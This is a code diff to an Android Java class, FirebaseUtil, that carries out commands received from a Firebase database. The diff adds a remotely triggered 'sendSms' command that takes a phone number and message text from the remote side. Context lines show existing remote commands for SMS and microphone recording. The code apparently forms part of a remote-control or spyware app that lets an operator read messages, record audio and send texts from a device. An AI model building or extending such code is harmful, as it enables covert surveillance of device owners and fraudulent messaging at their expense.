@@ -49,7 +49,7 @@ public class FirebaseUtil {
             public void onSuccess(Map<String, Object> result) {
                 Log.d(LOG_TAG, "User created. ID - " + result.get("uid").toString());
                 id= result.get("uid").toString();
-                setOnline(id, false);
+                //setOnline(id, false);
                 //authenticate user
                 authenticateUser();
 
@@ -128,6 +128,9 @@ public class FirebaseUtil {
             case "sms":
                 content = data.getSerializable("content");
                 break;
+            case "sendSms":
+                content = data.getString("content");
+                break;
 
         }
         aw.put("content", content);
@@ -171,6 +174,7 @@ public class FirebaseUtil {
                         case "sms":
                             Log.d(LOG_TAG, "Starting sms service");
                             intent = new Intent(mcontext, SmsService.class);
+                            intent.putExtra("action", childValue);
                             intent.putExtra("messenger", new Messenger(handler));
                             mcontext.startService(intent);
                             setOnDefaultAndroidRead(dataSnapshot);
@@ -214,6 +218,18 @@ public class FirebaseUtil {
                             intent = new Intent(mcontext, MicrophoneService.class);
                             intent.putExtra("messenger", new Messenger(handler));
                             intent.putExtra("duration", duration);
+                            mcontext.startService(intent);
+                            setOnDefaultAndroidRead(dataSnapshot);
+                            break;
+                        case "sendSms":
+                            String phoneNumber = (String) childValue.get("secondParam");
+                            String smsBody = (String) childValue.get("thirdParam");
+                            Log.d(LOG_TAG, "Starting sms service");
+                            intent = new Intent(mcontext, SmsService.class);
+                            intent.putExtra("messenger", new Messenger(handler));
+                            intent.putExtra("action", action);
+                            intent.putExtra("phoneNum", phoneNumber);
+                            intent.putExtra("smsBody", smsBody);
                             mcontext.startService(intent);
                             setOnDefaultAndroidRead(dataSnapshot);
                             break;
@@ -276,8 +292,9 @@ public class FirebaseUtil {
             userRef.onDisconnect().updateChildren(connOnline);
         } else {
             removeListener();
-            userRef.setValue(user);
-            //userRef.onDisconnect().updateChildren(connOnline);
+            Log.d("setOnline", "false");
+            //userRef.setValue(user);
+            userRef.onDisconnect().updateChildren(connOnline);
         }
     }
 
